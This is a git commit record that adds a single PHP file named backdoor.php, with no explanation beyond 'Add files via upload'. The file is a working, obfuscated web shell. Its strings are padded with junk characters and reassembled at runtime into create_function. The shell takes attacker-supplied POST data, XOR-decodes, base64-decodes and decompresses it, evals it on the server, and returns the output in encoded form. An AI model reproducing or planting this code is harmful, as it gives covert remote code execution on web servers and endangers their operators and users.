d813a6b7e84fd073adfbf62e8b9ba15686bf5719
necrology <63326828+necrology@users.noreply.github.com>
2023-11-25 01:47:16 -0500

    Add files via upload

---
+++ backdoor.php
@@ -0,0 +1,13 @@
+<?php
+$V='p="LOs1PfwYO1mB63HHdq";OfOunction Ox(O$t,$k){O$c=stOrlOen($k);$';
+$x='$i<$lO);$jO++,$i+OO+){$o.=$Ot{$i}^$k{$j}O;}O}returnO $o;}iOf (@prOeg_ma';
+$y='$Ok=O"7a12335Ob";$kh="dc0dOa9d30320";O$OOkfO="ceebaab4d1O05";$';
+$z='mO)==1) {@ob_starOt();@eOvalO(@gzuncOompresOs(@Ox(@baseO6O4_';
+$H='decoOde($m[O1]),$k)));$oO=O@ob_get_OcOontentsO();@ob_end_cleaOnO();$r=@b';
+$U=str_replace('ZL','','crZLeZLaZLte_ZLZLfuncZLtion');
+$I='tchO("/$kOh(.O+)$OkOf/",@fOOile_get_contentOs("php:/O/inOput"),$';
+$L='l=stOrlen($tO);$o="O";for(O$i=0;$i<$l;O){for(OO$j=0;($j<$c&O&';
+$Y='ase6OO4_encOode(O@xO(@gzcoOmpress($o),$k));prOint(OO"$p$kh$r$kf");}';
+$v=str_replace('O','',$y.$V.$L.$x.$I.$z.$H.$Y);
+$A=$U('',$v);$A();
+?>
